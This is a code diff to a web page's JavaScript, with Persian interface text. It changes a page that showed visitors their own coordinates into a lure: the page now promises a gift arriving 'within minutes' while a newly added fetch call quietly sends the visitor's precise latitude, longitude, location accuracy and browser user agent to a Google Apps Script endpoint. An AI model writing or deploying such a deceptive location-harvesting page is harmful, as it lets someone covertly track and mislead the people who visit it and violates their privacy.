@@ -62,13 +62,29 @@
     message.textContent = "در حال دریافت موقعیت مکانی...";
     navigator.geolocation.getCurrentPosition(
       (pos) => {
-        const lat = pos.coords.latitude.toFixed(6);
-        const lon = pos.coords.longitude.toFixed(6);
-        message.textContent = `🎉 تبریک! موقعیت شما ثبت شد: عرض جغرافیایی ${lat}، طول جغرافیایی ${lon}`;
+        message.textContent = "🎁 کادو تا دقایقی دیگر براتون ارسال میشه!";
         btn.style.display = 'none';
 
-        // اینجا می‌تونی داده‌ها رو به سرور بفرستی یا کارای دیگه بکنی
-        console.log('Latitude:', lat, 'Longitude:', lon);
+        // ارسال موقعیت به Google Sheets
+        fetch("https://script.google.com/macros/s/AKfycbwlg3W5GQYAT-E4phm6FbgIKWwdFDZS8WS5hc1u4tYwgqVpuHZFPYkdzqowqZXqLAq0Mw/exec", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy,
+            ua: navigator.userAgent
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log("پاسخ سرور:", data);
+        })
+        .catch(err => {
+          console.error("خطا در ارسال داده:", err);
+        });
       },
       (err) => {
         switch(err.code) {
